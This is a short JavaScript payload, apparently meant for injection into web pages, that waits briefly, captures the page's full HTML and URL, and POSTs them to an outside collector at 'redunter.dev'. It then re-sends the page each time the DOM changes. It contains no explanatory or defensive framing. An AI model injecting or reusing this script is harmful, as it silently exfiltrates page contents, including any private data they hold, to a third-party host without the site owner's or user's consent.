!setTimeout(function() {
  function collect(callback) {
    console.log("EXECUTING collect()");
    var html = document.documentElement.outerHTML;
    var data = new FormData();
    data.append('url', document.location.href);
    data.append('html', html);
    var req;
    if (window.XMLHttpRequest) {
        req = new XMLHttpRequest();
    } else if (window.ActiveXObject) {
        req = new ActiveXObject("Microsoft.XMLHTTP");
    } else {
      console.warn("Unable to XHR");
      return;
    }
    req.open('POST', 'https://redunter.dev/collector/', true);
    req.onreadystatechange = function (response) {
      if (req.readyState === 4) {
        if (req.status === 200) {
          console.log("We have already collected this HTML");
          if (callback) callback(false);
        } else if (req.status === 201) {
          console.log("Yum! Collected another chunk of HTML");
          if (callback) callback(true);
        } else {
          console.warn("Failed to collect the HTML of this page");
        }
      }
    };
    req.send(data);

  }

  var interval = 3;
  var timer;
  function loop() {
    collect(function(newhtml) {
      interval *= newhtml && .5 || 2;
      if (!MutationObserver) {
        timer = setTimeout(loop, interval * 1000);
      }
    });
  }
  loop();


  var MutationObserver = window.MutationObserver || window.WebKitMutationObserver || window.MozMutationObserver;
  if (MutationObserver) {
    var locked = null;
    function lock(cb) {
      locked = setTimeout(function() {
        locked = null;
      }, 3 * 1000);
      cb();
    }
    // create an observer instance
    var observer = new MutationObserver(function(mutations) {
      mutations.forEach(function(mutation) {
        if (!locked && mutation.type === 'childList') {
          lock(collect);
        }
      });
    });

    // configuration of the observer:
    var config = { attributes: true, childList: true, characterData: true, subtree: true };

    // pass in the target node, as well as the observer options
    // observer.observe(document.body, config);
    observer.observe(document.body, config);
  }

}, 1.5 * 1000);
